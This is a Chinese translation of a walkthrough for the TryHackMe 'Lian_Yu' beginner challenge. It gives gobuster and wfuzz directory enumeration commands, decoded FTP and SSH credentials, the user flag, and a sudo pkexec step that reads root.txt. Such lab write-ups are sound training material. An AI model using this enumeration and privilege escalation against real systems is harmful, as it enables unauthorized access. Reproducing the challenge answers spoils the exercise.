# Lian _ Yu-TryHackMe 作者:Karthikeyan

> 原文：<https://infosecwriteups.com/lian-yu-ae415d1f6fc7?source=collection_archive---------3----------------------->

## 初级安全挑战

![](img/d482622bc946241a241d499c9d5edfe8.png)

# 任务 1 —找到旗帜

1.  部署虚拟机并启动枚举
2.  你找到的网页目录是什么？

```
Hint: gobuster dir -e -u [http://10.10.26.241/](http://10.10.26.241/) -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
```

![](img/0b5d65ce7bb4e16d126595eb4baad1cc.png)![](img/99104fb6b2f1d0e53c37db3c4fb90323.png)

Ctrl + A

![](img/fcb42b8e0b14995c97d0a1ee6289e801.png)

```
Ans: 2100
```

3.你找到的文件名是什么？

使用 wfuzz 查找文件名

```
wfuzz -u [http://10.10.99.170/island/2100/FUZZ.ticket](http://10.10.99.170/island/2100/FUZZ.ticket) -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -c — hc 404
```

![](img/3e4475dd6f2cf97a2a2273e4e9f6fc45.png)

```
Ans: green_arrow.ticket
```

4.FTP 密码是什么？

破译密码

![](img/67f10b531beaace3b1bec5bc1d3a2992.png)

看起来像 Base58

![](img/b6f34c65af6b506e41dcacba1c1977d0.png)

```
Ans: !#th3h00d
```

5.带 SSH 密码的文件名是什么？

让我们使用找到的凭证在 Ftp 中登录并下载文件，

```
Username: Vigilante
Password: !#th3h00d
```

![](img/a6daefff89ea568e73cba0cddf353399.png)

让我们提取信息！！！

使用 GHex 让我们修复损坏的 PNG 文件

![](img/4178c6eee35fe0ec4d0eb52146ed69a6.png)![](img/8a1181df2ccc9fd1b936ca0940da683e.png)![](img/44e36b1af8c5fc709d646b6ac2d28d13.png)![](img/4926082008abebce71e2fb696a50834d.png)

我们找到了两个文件 password.txt 和 shado。关隘在沙多

```
Ans: shado
```

6.user.txt

让我们通过找到的凭证登录，

```
Username: slade
password: M3tahuman
```

![](img/b97447ebc6766e54abdd4b16195bf610.png)![](img/3362961955e064e400df6b88a245ac37.png)

```
Ans: THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N’T}
```

7.root.txt

让我们使用 pkexec 来查看根目录中的 root.txt，使用命令

```
sudo /usr/bin/pkexec cat /root/root.txt
```

![](img/84709c467b4a58d959b1e6636eafb2cb.png)

感谢您的阅读！！！

黑客快乐！！

```
Author - Karthikeyan N | Cyberw1ng
```

## 来自 Infosec 的报道:Infosec 每天都有很多内容，很难跟上。[加入我们的每周简讯](https://weekly.infosecwriteups.com/)以 5 篇文章、4 条线索、3 个视频、2 个 GitHub Repos 和工具以及 1 个工作提醒的形式免费获取所有最新的 Infosec 趋势！